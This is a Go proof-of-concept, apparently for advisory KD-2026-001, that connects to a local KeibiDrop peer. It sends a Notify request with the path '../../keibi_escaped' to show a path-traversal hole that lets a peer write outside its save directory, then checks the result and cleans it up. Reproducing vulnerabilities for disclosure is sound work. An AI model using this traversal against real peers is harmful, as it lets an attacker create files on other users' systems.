// ABOUTME: Live network PoC for KD-2026-001 — connects to a running KeibiDrop peer and sends a traversal path.
// ABOUTME: Run standalone with: go run attacker_traversal.go (requires relay + Alice peer running)

//go:build ignore

package main

import (
	"context"
	"fmt"
	"log/slog"
	"net/url"
	"os"
	"time"

	"github.com/KeibiSoft/KeibiDrop/pkg/logic/common"
	bindings "github.com/KeibiSoft/KeibiDrop/grpc_bindings"
)

func main() {
	aliceFp := "HfLcY5xUYEEFUCEJqwVv8FJAYUU1uzfyxYSZjkhPRyjkpBVR4a6LjaPrS01RVC3rjqSgchZCRPOzX1IgBaBUWQ"
	relayUrl, _ := url.Parse("http://127.0.0.1:54321")
	
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	
	// Start Attacker KeibiDrop
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	
	kd, err := common.NewKeibiDrop(ctx, logger, false, relayUrl, 27003, 27004, "/tmp/attacker_mount", "/tmp/attacker_save", false, false)
	if err != nil {
		fmt.Printf("Failed to create KeibiDrop: %v\n", err)
		return
	}
	
	go kd.Run()
	
	fmt.Println("Registering Alice's fingerprint...")
	kd.AddPeerFingerprint(aliceFp)
	
	fmt.Println("Joining room...")
	err = kd.JoinRoom()
	if err != nil {
		fmt.Printf("Failed to join room: %v\n", err)
		return
	}
	
	fmt.Println("Connected! Sending malicious Notify...")
	
	// Traversal to escape /tmp/alice_save and create a folder in /tmp
	traversalPath := "../../keibi_escaped"
	
	_, err = kd.KDClient.Notify(ctx, &bindings.NotifyRequest{
		Type: bindings.NotifyType_ADD_DIR,
		Path: traversalPath,
	})
	
	if err != nil {
		fmt.Printf("Notify failed: %v\n", err)
	} else {
		fmt.Println("Notify sent successfully!")
	}
	
	fmt.Println("Checking if /tmp/keibi_escaped was created...")
	time.Sleep(2 * time.Second)
	if _, err := os.Stat("/tmp/keibi_escaped"); err == nil {
		fmt.Println("\n[!] SUCCESS: Path Traversal Vulnerability Reproduced!")
		fmt.Println("Directory /tmp/keibi_escaped exists.")
		os.Remove("/tmp/keibi_escaped")
	} else {
		fmt.Println("\n[-] Failure: Directory /tmp/keibi_escaped does not exist.")
	}
}
